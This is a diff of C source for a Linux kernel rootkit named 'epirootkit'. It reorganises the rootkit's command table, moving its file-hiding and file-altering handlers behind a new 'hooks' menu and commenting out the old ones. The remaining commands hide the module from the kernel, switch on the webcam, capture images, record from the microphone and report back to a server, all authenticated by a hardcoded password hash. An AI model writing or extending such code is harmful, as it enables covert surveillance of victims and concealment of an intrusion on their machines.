@@ -8,15 +8,8 @@
 #include <linux/socket.h>
 #include <linux/string.h>
 
+#include "interceptor/core/menu.h"
 #include "epirootkit.h"
-
-struct command {
-    char *cmd_name;
-    unsigned cmd_name_size;
-    char *cmd_desc;
-    unsigned cmd_desc_size;
-    int (*cmd_handler)(char *args);
-};
 
 u8 passwd_hash[SHA256_DIGEST_SIZE] = {
     0x5e, 0x7e, 0x56, 0x44, 0xa5, 0xeb, 0xfd,
@@ -65,17 +58,12 @@ static struct command rootkit_commands_array[] = {
     { "killcom", 7, "exit the module", 16, killcom_handler },
     { "hide_module", 11, "hide the module from the kernel", 34, hide_module_handler },
     { "unhide_module", 13, "unhide the module in the kernel", 36, unhide_module_handler },
-    { "hide", 4, "hide a directory or file", 34, hide_dir_handler },
-    { "unhide", 6, "unhide a directory or file", 36, show_dir_handler },
-    { "list", 4, "list hidden directories and files", 24, list_dir_handler },
-    { "modify", 6, "in a file, replace or hide words and lines", 43, modify_file_handler },
-    { "unmodify", 8, "undo modify", 12, unmodify_file_handler },
-    { "list_modified", 13, "list modified files", 20, list_mods_handler },
     { "help", 4, "display this help message", 30, help_handler },
     { "start_webcam", 11, "activate webcam", 20, start_webcam_handler },
     { "capture_image", 13, "capture an image with the webcam", 50, capture_image_handler },
     { "start_microphone", 15, "start recording from microphone", 40, start_microphone_handler },
     { "play_audio", 10, "play an audio file", 40, play_audio_handler },
+    { "hooks", 5, "manage hide/forbid/alter rules",  30, hooks_menu_handler },
     { NULL, 0, NULL, 0, NULL }
 };
 
@@ -298,6 +286,7 @@ int unhide_module_handler(char *args) {
     return ret_code;
 }
 
+/*
 int hide_dir_handler(char *args) {
     char *dir = args;
     dir += strspn(dir, " \t");
@@ -343,6 +332,8 @@ int list_dir_handler(char *args) {
     kfree(buf);
     return 0;
 }
+*/
+
 // Command to start the webcam and capture an image
 int start_webcam_handler(char *args) {
     DBG_MSG("start_webcam_handler: starting webcam to capture an image\n");
@@ -416,11 +407,7 @@ int play_audio_handler(char *args) {
     send_to_server("Audio played\n");
     return SUCCESS;
 }
-
-/**
- * Syntax: modify_file <full_path> [hide_line=<N>] [hide_substr=<substr>] [replace=<src>:<dst>]
- * Pas hyper bien, mais flemme de faire mieux, ras le cul du parsing
- */
+/*
 int modify_file_handler(char *args) {
 
     // Parameters
@@ -487,4 +474,4 @@ int list_mods_handler(char *args) {
         send_to_server("No modifications defined\n");
     kfree(buf);
     return 0;
-}
+}*/
